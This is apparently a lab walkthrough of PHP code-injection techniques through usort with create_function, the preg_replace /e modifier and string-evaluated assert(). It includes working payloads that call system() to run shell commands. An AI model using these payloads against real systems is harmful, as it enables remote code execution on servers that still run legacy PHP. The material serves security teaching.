When ordering information, developers can use two methods:

order by in a SQL request;
usort in PHP code.
The function usort is often used with the function create_function to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.

By injecting a single quote, we can get an idea of what is going on:

```php
Parse error: syntax error, unexpected '',$b->id'' (T_CONSTANT_ENCAPSED_STRING) in /var/www/index.php(29) : 
runtime-created function on line 1
Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/index.php
 on line 29
```
The source code of the function looks like the following:

```php
ZEND_FUNCTION(create_function)
{
  [...]
  eval_code = (char *) emalloc(eval_code_length);
  sprintf(eval_code, "function " LAMBDA_TEMP_FUNCNAME "(%s){%s}", Z_STRVAL_PP(z_function_args), Z_STRVAL_PP(z_function_code));
 
  eval_name = zend_make_compiled_string_description("runtime-created function" TSRMLS_CC);
  retval = zend_eval_string(eval_code, NULL, eval_name TSRMLS_CC);
  [...]
```

We can see that the code that will be evaluated is put inside curly brackets {...}, and we will need this information to correctly finish the syntax, after our injection.

As opposed to the previous code injection, here, you are not injecting inside single or double quotes. We know that we need to close the statement with } and comment out the rest of the code using // or # (with encoding). We can try poking around with:

```?order=id;}//```: we get an error message (Parse error: syntax error, unexpected ';'). We are probably missing one or more brackets.
```?order=id);}//```: we get a **warning**. That seems about right.
```?order=id));}//```: we get an error message (Parse error: syntax error, unexpected ')' i). We probably have too many closing brackets.
Since we now know how to finish the code correctly (a warning does not stop the execution flow), we can inject arbitrary code and gain code execution using ```?order=id);}system('uname%20-a');//```, as an example.

This challenge is based on a vulnerability in PHPMyAdmin: CVE-2008-4096

---

### PREG_REPLACE

```php
<?php
    if (!isset($_GET["new"])) {
        header("Location: /?new=user&pattern=/lamer/&base=Hello%20lamer");
        die();
    }
    require "header.php";
?>

<div class="row">
    <div class="col-lg-12">
        <h1>Code Execution 03</h1>
    <h1>
        <?php
        echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
        ?>
    </h1>
</div>
```

`echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);`

preg_replate perform a regular expression search and replace.

### Description
```php
preg_replace( string|array $pattern , string|array $replacement , string|array $subject [, int $limit = -1 [, int $count = null ]] ) : string|array|null 
```
Search *subject* for matches to *pattern* and replaces them with *replacement*.

This feature hsa been DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.

Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e).

This modifier will cause the function `preg_replace` to evaluate the new value as PHP code, before performing the substitution.

PCRE_REPLACE_EVAL has been deprecated as of PHP 5.5.0
Here, you will need to change the pattern, by adding the /e modifier. Once you have added this modifier, you should get a notice:

Notice: Use of undefined constant hacker - assumed 'hacker' in /var/www/codeexec/example3.php(3) : regexp code on line 1
The function preg_replace tries to evaluate the value hacker as a constant, but as it is not defined, you get this error message.

You can easily replace hacker with a call to the function phpinfo() to get a visible result.

Once you can see the result of the phpinfo function, you can use the function system to run any command.

---

### assert()

This example is based on the function `assert`.

When used incorrectly, `assert` will evaluate the value received. This behaviour can be used to gain code execution.

By injecting a single quote or double quote (depending on the way the string was declared), we can see an error message indicating that PHP tried to evaluate the code:

```php
Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
```
Once we have broke the syntax, we need to try to reconstruct it correctly. We can try the following: `hacker'.'`. We can now see that the error message has disappeared.

Now that we know how to finish the syntax to avoid errors, we can just inject our payload to run the function `phpinfo(): hacker'.phpinfo().'` and we get the configuration of the PHP engine in the page.

Finally, we can use system to score.

This trick will no longer work with most PHP 7 and all PHP 8 applications. 

`assert()` will no longer evaluate string arguments, instead they will be treated like any other argument. `assert($a == $b)` should be used instead of `assert('$a == $b')`. The `assert.quiet_eval php.ini` directive and the `ASSERT_QUIET_EVAL` constant have also been removed, as they would no longer have any effect.

Other payload example:

`phpinfo():teste'.system('uname -a').'`
